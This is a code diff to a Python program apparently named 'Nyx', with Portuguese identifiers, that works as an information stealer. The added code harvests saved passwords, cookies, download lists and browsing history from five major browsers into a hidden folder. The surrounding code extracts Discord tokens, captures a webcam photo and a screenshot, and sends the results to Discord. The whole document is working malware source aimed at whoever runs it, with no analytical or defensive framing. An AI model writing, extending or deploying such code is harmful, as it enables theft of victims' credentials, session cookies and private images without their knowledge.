@@ -7,6 +7,9 @@ from plugins.webcam import capture_photo
 from plugins.userinfo import UserInfos
 from plugins.operationsystem import get_os_info
 from plugins.password import PasswordExtractor
+from plugins.downloads import BrowserDownloadsExtractor
+from plugins.history import BrowserDataExtractor
+from plugins.cookies import CookieExtractor
 from plugins.print import Sprint, save_image, get_image_bytes
 from datetime import datetime
 
@@ -54,16 +57,106 @@ def enviar_para_discord(mensagem, embed=None):
     if response.status_code != 204:
         print(f"Erro ao enviar para o Discord: {response.status_code} - {response.text}")
 
+def executar_password_extractor():
+    try:
+        navegadores_suportados = ['Chrome', 'Firefox', 'Edge', 'Opera', 'Brave']
+        for navegador in navegadores_suportados:
+            navegador_map = {
+                'Chrome': 'chrome',
+                'Firefox': 'firefox',
+                'Edge': 'edge',
+                'Opera': 'opera',
+                'Brave': 'brave'
+            }
+
+            navegador_convertido = navegador_map[navegador]
+            extractor = PasswordExtractor(navegador_convertido)
+            passwords = extractor.get_passwords()
+
+            if passwords:
+                passwords_file_path = os.path.join(pasta_nyx, f"{navegador_convertido}_passwords.txt")
+                extractor.save_passwords_to_file(passwords, passwords_file_path)
+
+    except Exception as e:
+        print(f"Erro ao executar PasswordExtractor: {e}")
+
+def executar_browser_downloads():
+    try:
+        navegadores_suportados = ['Chrome', 'Firefox', 'Edge', 'Opera', 'Brave']
+        for navegador in navegadores_suportados:
+            navegador_map = {
+                'Chrome': 'chrome',
+                'Firefox': 'firefox',
+                'Edge': 'edge',
+                'Opera': 'opera',
+                'Brave': 'brave'
+            }
+
+            navegador_convertido = navegador_map[navegador]
+            extractor = BrowserDownloadsExtractor(navegador_convertido)
+            downloads = extractor.get_downloads()
+
+            if downloads:
+                downloads_file_path = os.path.join(pasta_nyx, f"{navegador_convertido}_downloads.txt")
+                extractor.save_downloads_to_file(downloads, downloads_file_path)
+
+    except Exception as e:
+        print(f"Erro ao executar BrowserDownloadsExtractor: {e}")
+
+def executar_browser_history():
+    try:
+        navegadores_suportados = ['Chrome', 'Firefox', 'Edge', 'Opera', 'Brave']
+        for navegador in navegadores_suportados:
+            navegador_map = {
+                'Chrome': 'chrome',
+                'Firefox': 'firefox',
+                'Edge': 'edge',
+                'Opera': 'opera',
+                'Brave': 'brave'
+            }
+
+            navegador_convertido = navegador_map[navegador]
+            extractor = BrowserDataExtractor(navegador_convertido)
+            history = extractor.get_history()
+
+            if history:
+                history_file_path = os.path.join(pasta_nyx, f"{navegador_convertido}_history.txt")
+                extractor.save_history_to_file(history, history_file_path)
+
+    except Exception as e:
+        print(f"Erro ao executar BrowserDataExtractor: {e}")
+
+def executar_cookie_extractor():
+    try:
+        navegadores_suportados = ['Chrome', 'Firefox', 'Edge', 'Opera', 'Brave']
+        for navegador in navegadores_suportados:
+            navegador_map = {
+                'Chrome': 'chrome',
+                'Firefox': 'firefox',
+                'Edge': 'edge',
+                'Opera': 'opera',
+                'Brave': 'brave'
+            }
+
+            navegador_convertido = navegador_map[navegador]
+            extractor = CookieExtractor(navegador_convertido)
+            cookies = extractor.get_cookies()
+
+            if cookies:
+                cookies_file_path = os.path.join(pasta_nyx, f"{navegador_convertido}_cookies.txt")
+                extractor.save_cookies_to_file(cookies, cookies_file_path)
+
+    except Exception as e:
+        print(f"Erro ao executar CookieExtractor: {e}")
+
 if __name__ == "__main__":
     try:
         informacoes_sistema = obter_informacoes_sistema()
         discord_info = TokenExtractor()
         discord_info.extract_tokens()
         
-        # Capture foto da webcam e salve
         webcam_foto = capture_photo()
         
-        # Crie a imagem da tela e salve-a
         screenshot = Sprint()
         screenshot_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Nyx', 'prtscr.png')
         save_image(screenshot, screenshot_path)
@@ -132,11 +225,16 @@ if __name__ == "__main__":
 
                 enviar_para_discord('', embed=discord_embed)
 
-                if webcam_foto:
-                    enviar_imagem_para_discord(webcam_foto)
+        executar_password_extractor()
+        executar_browser_downloads()
+        executar_browser_history()
+        executar_cookie_extractor()
 
-                if os.path.exists(screenshot_path):
-                    enviar_imagem_para_discord(screenshot_path)
+        if webcam_foto:
+            enviar_imagem_para_discord(webcam_foto)
+
+        if os.path.exists(screenshot_path):
+            enviar_imagem_para_discord(screenshot_path)
 
     except Exception as e:
         print(f"Erro geral: {e}")
